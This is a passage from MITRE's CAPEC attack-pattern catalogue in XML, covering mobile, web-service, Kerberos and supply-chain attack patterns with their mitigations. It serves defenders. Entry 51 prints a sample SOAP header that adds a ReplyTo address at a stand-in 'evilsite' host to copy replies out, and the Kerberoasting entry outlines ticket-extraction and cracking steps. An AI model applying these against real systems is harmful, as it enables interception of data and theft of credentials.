            <Mitigation>The only known mitigation to this type of attack is to keep the malicious application off the system. There is nothing that can be done to the target application to protect itself from a malicious application that has been installed and executed.</Mitigation>
         </Mitigations>
         <References>
            <Reference External_Reference_ID="REF-430"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="501" Name="Activity Hijack" Abstraction="Detailed" Status="Draft">
         <Description>An adversary intercepts an implicit intent sent to launch a trusted activity and instead launches a counterfeit activity in its place. The malicious activity is then used to mimic the trusted activity's user interface and prompt the target to enter sensitive data as if they were interacting with the trusted activity.</Description>
         <Typical_Severity>Medium</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="499"/>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="173"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The adversary must have previously installed the malicious application that will run in place of the trusted activity.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="High">The adversary must typically overcome network and host defenses in order to place malware on the system.</Skill>
         </Skills_Required>
         <Resources_Required>
            <Resource>Malware capable of acting on the adversary's objectives.</Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>To mitigate this type of an attack, explicit intents should be used whenever sensitive data is being sent. An 'explicit intent' is delivered to a specific application as declared within the intent, whereas an 'implicit intent' is directed to an application as defined by the Android operating system. If an implicit intent must be used, then it should be assumed that the intent will be received by an unknown application and any response should be treated accordingly (i.e., with appropriate security controls).</Mitigation>
            <Mitigation>Never use implicit intents for inter-application communication.</Mitigation>
         </Mitigations>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="923"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-427" Section="3.1.2 Activity Hijacking"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Attack_Motivation-Consequences, Attack_Prerequisites, Attacker_Skills_or_Knowledge_Required, Description Summary, References, Related_Weaknesses, Resources_Required, Solutions_and_Mitigations, Typical_Severity</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="502" Name="Intent Spoof" Abstraction="Standard" Status="Draft">
         <Description>An adversary, through a previously installed malicious application, issues an intent directed toward a specific trusted application's component in an attempt to achieve a variety of different objectives including modification of data, information disclosure, and data injection. Components that have been unintentionally exported and made public are subject to this type of an attack. If the component blindly trusts the intent's action, then the target application performs the functionality at the adversary's request, helping the adversary achieve the desired negative technical impact.</Description>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="148">
               <Exclude_Related Exclude_ID="512"/>
               <Exclude_Related Exclude_ID="515"/>
            </Related_Attack_Pattern>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>An adversary must be able install a purpose built malicious application onto the Android device and convince the user to execute it. The malicious application will be used to issue spoofed intents.</Prerequisite>
         </Prerequisites>
         <Mitigations>
            <Mitigation>To limit one's exposure to this type of attack, developers should avoid exporting components unless the component is specifically designed to handle requests from untrusted applications. Developers should be aware that declaring an intent filter will automatically export the component, exposing it to public access. Critical, state-changing actions should not be placed in exported components. If a single component handles both inter- and intra-application requests, the developer should consider dividing that component into separate components. If a component must be exported (e.g., to receive system broadcasts), then the component should dynamically check the caller's identity prior to performing any operations. Requiring Signature or SignatureOrSystem permissions is an effective way of limiting a component's exposure to a set of trusted applications. Finally, the return values of exported components can also leak private data, so developers should check the caller's identity prior to returning sensitive values.</Mitigation>
         </Mitigations>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="284"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-427"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns, Related_Weaknesses</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="503" Name="WebView Exposure" Abstraction="Standard" Status="Draft">
         <Description>An adversary, through a malicious web page, accesses application specific functionality by leveraging interfaces registered through WebView's addJavascriptInterface API. Once an interface is registered to WebView through addJavascriptInterface, it becomes global and all pages loaded in the WebView can call this interface.</Description>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="122"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>This type of an attack requires the adversary to convince the user to load the malicious web page inside the target application. Once loaded, the malicious web page will have the same permissions as the target application and will have access to all registered interfaces. Both the permission and the interface must be in place for the functionality to be exposed.</Prerequisite>
         </Prerequisites>
         <Mitigations>
            <Mitigation>To mitigate this type of an attack, an application should limit permissions to only those required and should verify the origin of all web content it loads.</Mitigation>
         </Mitigations>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="284"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-430"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Related_Weaknesses</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="504" Name="Task Impersonation" Abstraction="Detailed" Status="Draft">
         <Description>An adversary, through a previously installed malicious application, monitors the task list maintained by the operating system and waits for a specific legitimate task to become active. Once the task is detected, the malicious application launches a new task in the foreground that mimics the user interface of the legitimate task. At this point, the user thinks that they are interacting with the legitimate task that they started, but instead they are interacting with the malicious application. This type of attack is most often used to obtain sensitive information (e.g., credentials) from the user. Once the adversary's goal is reached, the malicious application can exit, leaving the original trusted application visible and the appearance that nothing out of the ordinary has occurred.</Description>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="173"/>
         </Related_Attack_Patterns>
         <Mitigations>
            <Mitigation>The only known mitigation to this attack is to avoid installing the malicious application on the device. However, the malicious application does need the GET_TASKS permission to be able to query the task list, and being suspicious of applications with that permission can help.</Mitigation>
         </Mitigations>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="1021"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-434" Section="4.1.2 Man-In-The-Middle"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Related_Weaknesses</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="505" Name="Scheme Squatting" Abstraction="Detailed" Status="Draft">
         <Description>An adversary, through a previously installed malicious application, registers for a URL scheme intended for a target application that has not been installed. Thereafter, messages intended for the target application are handled by the malicious application. Upon receiving a message, the malicious application displays a screen that mimics the target application, thereby convincing the user to enter sensitive information. This type of attack is most often used to obtain sensitive information (e.g., credentials) from the user as they think that they are interacting with the intended target application.</Description>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="173"/>
         </Related_Attack_Patterns>
         <Mitigations>
            <Mitigation>The only known mitigation to this attack is to avoid installing the malicious application on the device. Applications usually have to declare the schemes they wish to register, so detecting this during a review is feasible.</Mitigation>
         </Mitigations>
         <References>
            <Reference External_Reference_ID="REF-434" Section="4.1.2 Man-In-The-Middle"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated References</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="506" Name="Tapjacking" Abstraction="Standard" Status="Draft">
         <Description>An adversary, through a previously installed malicious application, displays an interface that misleads the user and convinces him/her to tap on an attacker desired location on the screen. This is often accomplished by overlaying one screen on top of another while giving the appearance of a single interface. There are two main techniques used to accomplish this. The first is to leverage transparent properties that allow taps on the screen to pass through the visible application to an application running in the background. The second is to strategically place a small object (e.g., a button or text field) on top of the visible screen and make it appear to be a part of the underlying application. In both cases, the user is convinced to tap on the screen but does not realize the application that they are interacting with.</Description>
         <Likelihood_Of_Attack>Low</Likelihood_Of_Attack>
         <Typical_Severity>Low</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="173"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>This pattern of attack requires the ability to execute a malicious application on the user's device. This malicious application is used to present the interface to the user and make the attack possible.</Prerequisite>
         </Prerequisites>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="1021"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-436" Section="4. New Browserless Attacks"/>
            <Reference External_Reference_ID="REF-437"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-05-01</Modification_Date>
               <Modification_Comment>Updated Description Summary</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-08-04</Modification_Date>
               <Modification_Comment>Updated Related_Weaknesses</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Description Summary</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="507" Name="Physical Theft" Abstraction="Meta" Status="Draft">
         <Description>An adversary gains physical access to a system or device through theft of the item. Possession of a system or device enables a number of unique attacks to be executed and often provides the adversary with an extended timeframe for which to perform an attack. Most protections put in place to secure sensitive information can be defeated when an adversary has physical access and enough time.</Description>
         <Prerequisites>
            <Prerequisite>This type of attack requires the existence of a physical target that an adversary believes hosts something of value.</Prerequisite>
         </Prerequisites>
         <Mitigations>
            <Mitigation>To mitigate this type of attack, physical security techniques such as locks doors, alarms, and monitoring of targets should be implemented.</Mitigation>
         </Mitigations>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="509" Name="Kerberoasting" Abstraction="Detailed" Status="Draft">
         <Description>Through the exploitation of how service accounts leverage Kerberos authentication with Service Principal Names (SPNs), the adversary obtains and subsequently cracks the hashed credentials of a service account target to exploit its privileges. The Kerberos authentication protocol centers around a ticketing system which is used to request/grant access to services and to then access the requested services. As an authenticated user, the adversary may request Active Directory and obtain a service ticket with portions encrypted via RC4 with the private key of the authenticated account. By extracting the local ticket and saving it disk, the adversary can brute force the hashed value to reveal the target account credentials.</Description>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="560"/>
         </Related_Attack_Patterns>
         <Execution_Flow>
            <Attack_Step>
               <Step>1</Step>
               <Phase>Explore</Phase>
               <Description>Scan for user accounts with set SPN values</Description>
               <Technique>These can be found via Powershell or LDAP queries, as well as enumerating startup name accounts and other means.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>2</Step>
               <Phase>Explore</Phase>
               <Description>Request service tickets</Description>
               <Technique>Using user account's SPN value, request other service tickets from Active Directory</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>3</Step>
               <Phase>Experiment</Phase>
               <Description>Extract ticket and save to disk</Description>
               <Technique>Certain tools like Mimikatz can extract local tickets and save them to memory/disk.</Technique>
               <Technique/>
               <Technique/>
            </Attack_Step>
            <Attack_Step>
               <Step>4</Step>
               <Phase>Exploit</Phase>
               <Description>Crack the encrypted ticket to harvest plain text credentials</Description>
               <Technique>Leverage a brute force application/script on the hashed value offline until cracked. The shorter the password, the easier it is to crack.</Technique>
            </Attack_Step>
         </Execution_Flow>
         <Prerequisites>
            <Prerequisite>The adversary requires access as an authenticated user on the system. This attack pattern relates to elevating privileges.</Prerequisite>
            <Prerequisite>The adversary requires use of a third-party credential harvesting tool (e.g., Mimikatz).</Prerequisite>
            <Prerequisite>The adversary requires a brute force tool.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Medium"/>
         </Skills_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Gain Privileges</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Monitor system and domain logs for abnormal access.</Mitigation>
            <Mitigation>Employ a robust password policy for service accounts. Passwords should be of adequate length and complexity, and they should expire after a period of time.</Mitigation>
            <Mitigation>Employ the principle of least privilege: limit service accounts privileges to what is required for functionality and no more.</Mitigation>
            <Mitigation>Enable AES Kerberos encryption (or another stronger encryption algorithm), rather than RC4, where possible.</Mitigation>
         </Mitigations>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="552"/>
         </Related_Weaknesses>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <Entry_ID>1208</Entry_ID>
               <Entry_Name>Kerberoasting</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <References>
            <Reference External_Reference_ID="REF-559"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2019-04-04</Submission_Date>
            </Submission>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="51" Name="Poison Web Service Registry" Abstraction="Detailed" Status="Draft">
         <Description>SOA and Web Services often use a registry to perform look up, get schema information, and metadata about services. A poisoned registry can redirect (think phishing for servers) the service requester to a malicious service provider, provide incorrect information in schema or metadata (to effect a denial of service), and delete information about service provider interfaces. WS-Addressing is used to virtualize services, provide return addresses and other routing information, however, unless the WS-Addressing headers are protected they are vulnerable to rewriting. The attacker that can rewrite WS-addressing information gains the ability to route service requesters to any service providers, and the ability to route service provider response to any service. Content in a registry is deployed by the service provider. The registry in an SOA or Web Services system can be accessed by the service requester via UDDI or other protocol. The basic flow for the attacker consists of either altering the data at rest in the registry or uploading malicious content by spoofing a service provider. The service requester is then redirected to send its requests and/or responses to services the attacker controls.</Description>
         <Likelihood_Of_Attack>High</Likelihood_Of_Attack>
         <Typical_Severity>Very High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="203"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The attacker must be able to write to resources or redirect access to the service registry.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Low">To identify and execute against an over-privileged system interface</Skill>
         </Skills_Required>
         <Resources_Required>
            <Resource>Capability to directly or indirectly modify registry resources</Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Scope>Availability</Scope>
               <Impact>Execute Unauthorized Commands</Impact>
               <Note>Run Arbitrary Code</Note>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
            </Consequence>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Modify Data</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Design: Enforce principle of least privilege</Mitigation>
            <Mitigation>Design: Harden registry server and file access permissions</Mitigation>
            <Mitigation>Implementation: Implement communications to and from the registry using secure protocols</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>
               <xhtml:p>WS-Addressing provides location and metadata about the service endpoints. An extremely hard to detect attack is an attacker who updates the WS-Addressing header, leaves the standard service request and service provider addressing and header information intact, but adds an additional WS-Addressing Replyto header. In this case the attacker is able to send a copy (like a cc in mail) of every result the service provider generates. So every query to the bank account service, would generate a reply message of the transaction status to both the authorized service requester and an attacker service. This would be extremely hard to detect at runtime.</xhtml:p>
               <xhtml:div style="margin-left:10px;" class="informative">&lt;S:Header&gt;<xhtml:div style="margin-left:10px;">&lt;wsa:MessageID&gt;<xhtml:div style="margin-left:10px;">http://example.com/Message</xhtml:div>
                     <xhtml:br/>&lt;/wsa:MessageID&gt;<xhtml:br/>&lt;wsa:ReplyTo&gt;<xhtml:div style="margin-left:10px;">&lt;wsa:Address&gt;http://valid.example/validClient&lt;/wsa:Address&gt;</xhtml:div>
                     <xhtml:br/>&lt;/wsa:ReplyTo&gt;<xhtml:br/>&lt;wsa:ReplyTo&gt;<xhtml:div style="margin-left:10px;">&lt;wsa:Address&gt;http://evilsite/evilClient&lt;/wsa:Address&gt;</xhtml:div>
                     <xhtml:br/>&lt;/wsa:ReplyTo&gt;<xhtml:br/>&lt;wsa:FaultTo&gt;<xhtml:div style="margin-left:10px;">&lt;wsa:Address&gt;http://validfaults.example/ErrorHandler&lt;/wsa:Address&gt;</xhtml:div>
                     <xhtml:br/>&lt;/wsa:FaultTo&gt;</xhtml:div>
                  <xhtml:br/>&lt;/S:Header&gt;</xhtml:div>
               <xhtml:p>In this example "evilsite" is an additional reply to address with full access to all the messages that the authorized (validClient) has access to. Since this is registered with ReplyTo header it will not generate a Soap fault.</xhtml:p>
            </Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="285"/>
            <Related_Weakness CWE_ID="74"/>
            <Related_Weakness CWE_ID="693"/>
         </Related_Weaknesses>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="510" Name="SaaS User Request Forgery" Abstraction="Standard" Status="Draft">
         <Description>An adversary, through a previously installed malicious application, performs malicious actions against a third-party Software as a Service (SaaS) application (also known as a cloud based application) by leveraging the persistent and implicit trust placed on a trusted user's session. This attack is executed after a trusted user is authenticated into a cloud service, "piggy-backing" on the authenticated session, and exploiting the fact that the cloud service believes it is only interacting with the trusted user. If successful, the actions embedded in the malicious application will be processed and accepted by the targeted SaaS application and executed at the trusted user's privilege level.</Description>
         <Likelihood_Of_Attack>High</Likelihood_Of_Attack>
         <Typical_Severity>Medium</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="21"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>An adversary must be able install a purpose built malicious application onto the trusted user's system and convince the user to execute it while authenticated to the SaaS application.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Medium">This attack pattern often requires the technical ability to modify a malicious software package (e.g. Zeus) to spider a targeted site and a way to trick a user into a malicious software download.</Skill>
         </Skills_Required>
         <Mitigations>
            <Mitigation>To limit one's exposure to this type of attack, tunnel communications through a secure proxy service.</Mitigation>
            <Mitigation>Detection of this type of attack can be done through heuristic analysis of behavioral anomalies (a la credit card fraud detection) which can be used to identify inhuman behavioral patterns. (e.g., spidering)</Mitigation>
         </Mitigations>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="346"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-438"/>
         </References>
         <Notes>
            <Note Type="Other">SaaS/Cloud applications are often accessed from unmanaged systems and devices, over untrusted networks that are outside corporate IT control. The likelihood of a cloud service being accessed by a trusted user though an untrusted device is high. Several instances of this style of attack have been found.</Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="511" Name="Infiltration of Software Development Environment" Abstraction="Detailed" Status="Draft">
         <Description>An attacker uses common delivery mechanisms such as email attachments or removable media to infiltrate the IDE (Integrated Development Environment) of a victim manufacturer with the intent of implanting malware allowing for attack control of the victim IDE environment. The attack then uses this access to exfiltrate sensitive data or information, manipulate said data or information, and conceal these actions. This will allow and aid the attack to meet the goal of future compromise of a recipient of the victim's manufactured product further down in the supply chain.</Description>
         <Likelihood_Of_Attack>Low</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="444"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The victim must use email or removable media from systems running the IDE (or systems adjacent to the IDE systems).</Prerequisite>
            <Prerequisite>The victim must have a system running exploitable applications and/or a vulnerable configuration to allow for initial infiltration.</Prerequisite>
            <Prerequisite>The attacker must have working knowledge of some if not all of the components involved in the IDE system as well as the infrastructure.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Medium">Intelligence about the manufacturer's operating environment and infrastructure.</Skill>
            <Skill Level="High">Ability to develop, deploy, and maintain a stealth malicious backdoor program remotely in what is essentially a hostile environment.</Skill>
            <Skill Level="High">Development skills to construct malicious attachments that can be used to exploit vulnerabilities in typical desktop applications or system configurations. The malicious attachments should be crafted well enough to bypass typical defensive systems (IDS, anti-virus, etc)</Skill>
         </Skills_Required>
         <Example_Instances>
            <Example>The attacker, knowing the victim runs email on a system adjacent to the IDE system, sends a phishing email with a malicious attachment to the victim. When viewed, the malicious attachment installs a backdoor that allows the attacker to remotely compromise the adjacent IDE system from the victim's workstation. The attacker is then able to exfiltrate sensitive data about the software being developed on the IDE system.</Example>
         </Example_Instances>
         <References>
            <Reference External_Reference_ID="REF-439"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2015-11-09</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns, Typical_Likelihood_of_Exploit</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="516" Name="Hardware Component Substitution During Baselining" Abstraction="Detailed" Status="Draft">
         <Description>An attacker with access to system components during allocated baseline development can substitute a maliciously altered hardware component for a baseline component in the during the product development and research phase. This can lead to adjustments and calibrations being made in the product, so that when the final product with the proper components is deployed, it will not perform as designed and be advantageous to the attacker.</Description>
         <Likelihood_Of_Attack>Low</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="444"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The attacker will need either physical access or be able to supply malicious hardware components to the product development facility.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Medium">Intelligence data on victim's purchasing habits.</Skill>
            <Skill Level="High">Resources to maliciously construct/alter hardware components used for testing by the supplier.</Skill>
            <Skill Level="High">Resources to physically infiltrate supplier.</Skill>
         </Skills_Required>
         <Example_Instances>
            <Example>An attacker supplies the product development facility of a network security device with a hardware component that is used to simulate large volumes of network traffic. The device claims in logs, stats, and via the display panel to be pumping out very large quantities of network traffic, when it is in fact putting out very low volumes. The developed product is adjusted and configured to handle the what it believes to be a heavy network load, but when deployed at the victim site the large volumes of network traffic are dropped instead of being processed by the network security device. This allows the attacker an advantage when attacking the victim in that the attacker's presence may not be detected by the device.</Example>
         </Example_Instances>
         <References>
            <Reference External_Reference_ID="REF-439"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2015-11-09</Modification_Date>
               <Modification_Comment>Updated Examples-Instances, Related_Attack_Patterns, Typical_Likelihood_of_Exploit</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="517" Name="Documentation Alteration to Circumvent Dial-down" Abstraction="Detailed" Status="Draft">
         <Description>An attacker with access to a manufacturer's documentation, which include descriptions of advanced technology and/or specific components' criticality, alters the documents to circumvent dial-down functionality requirements. This alteration would change the interpretation of implementation and manufacturing techniques, allowing for advanced technologies to remain in place even though these technologies might be restricted to certain customers, such as nations on the terrorist watch list, giving the attacker on the receiving end of a shipped product access to an advanced technology that might otherwise be restricted.</Description>
         <Likelihood_Of_Attack>Low</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="447"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>Advanced knowledge of internal software and hardware components within manufacturer's development environment.</Prerequisite>
            <Prerequisite>Access to the manufacturer's documentation.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="High">Ability to read, interpret, and subsequently alter manufacturer's documentation to prevent dial-down capabilities.</Skill>
            <Skill Level="High">Ability to stealthly gain access via remote compromise or physical access to the manufacturer's documentation.</Skill>
         </Skills_Required>
         <Example_Instances>
            <Example>A product for manufacture exists that contains advanced cryptographic capabilities, including algorithms that are restricted from being shipped to some nations. An attacker from one of the restricted nations alters the documentation to ensure that when the product is manufactured for shipment to a restricted nation, the software compilation steps that normally would prevent the advanced cryptographic capabilities from being included are actually included. When the product is shipped to the attacker's home country, the attacker is able to retrieve and/or use the advanced cryptographic capabilities.</Example>
         </Example_Instances>
         <References>
            <Reference External_Reference_ID="REF-439"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2015-11-09</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns, Typical_Likelihood_of_Exploit</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="518" Name="Documentation Alteration to Produce Under-performing Systems" Abstraction="Detailed" Status="Draft">
         <Description>An attacker with access to a manufacturer's documentation alters the descriptions of system capabilities with the intent of causing errors in derived system requirements, impacting the overall effectiveness and capability of the system, allowing an attacker to take advantage of the introduced system capability flaw once the system is deployed.</Description>
         <Likelihood_Of_Attack>Low</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="447"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>Advanced knowledge of software and hardware capabilities of a manufacturer's product.</Prerequisite>
            <Prerequisite>Access to the manufacturer's documentation.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="High">Ability to read, interpret, and subsequently alter manufacturer's documentation to misrepresent system capabilities.</Skill>
            <Skill Level="High">Ability to stealthly gain access via remote compromise or physical access to the manufacturer's documentation.</Skill>
         </Skills_Required>
         <Example_Instances>
